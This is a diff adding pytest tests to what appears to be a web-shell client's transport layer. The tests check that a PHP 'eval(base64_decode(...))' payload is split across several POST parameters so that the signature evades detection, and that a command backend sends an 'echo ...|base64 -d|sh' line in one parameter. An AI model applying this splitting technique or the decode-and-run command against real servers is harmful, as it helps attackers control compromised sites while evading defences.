@@ -56,3 +56,33 @@ def test_read_timeout_is_not_retried():
     with pytest.raises(ConnectionFailed):
         t.send("echo 1")
     assert t._session.calls == 1
+
+
+class CapturingSession:
+    def __init__(self):
+        self.kwargs = None
+
+    def request(self, method, url, **kwargs):
+        self.kwargs = kwargs
+        return _ok_response()
+
+
+def test_multipart_splits_payload_across_params():
+    t = _transport(split=3, lang="php")
+    t._session = CapturingSession()
+    payload = "eval(base64_decode('AAAABBBBCCCC'));"
+    t.send(payload)
+    data = t._session.kwargs["data"]
+    # The eval param now carries only a small re-assembling loader...
+    assert data["c"].startswith("eval(") and "$_POST['p0']" in data["c"]
+    # ...and the chunks reconstruct the original payload exactly.
+    chunks = [data[f"p{i}"] for i in range(3)]
+    assert "".join(chunks) == payload
+    assert "base64_decode(" not in data["c"]  # signature is split across chunks
+
+
+def test_multipart_disabled_for_command_backend():
+    t = _transport(split=3, lang="command")
+    t._session = CapturingSession()
+    t.send("echo TOK|base64 -d|sh")
+    assert set(t._session.kwargs["data"]) == {"c"}  # single param, no splitting
